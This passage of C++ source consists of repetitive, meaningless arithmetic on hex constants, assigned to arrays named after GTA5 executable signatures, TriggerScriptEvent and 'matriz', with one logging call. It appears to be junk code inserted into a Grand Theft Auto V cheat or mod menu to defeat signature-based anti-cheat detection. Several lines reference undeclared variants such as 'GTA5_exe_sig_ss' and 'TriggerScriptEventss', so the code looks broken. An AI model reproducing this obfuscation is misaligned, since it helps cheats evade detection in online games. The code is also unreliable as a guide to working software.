			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<TextureVariation>0</TextureVariation>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
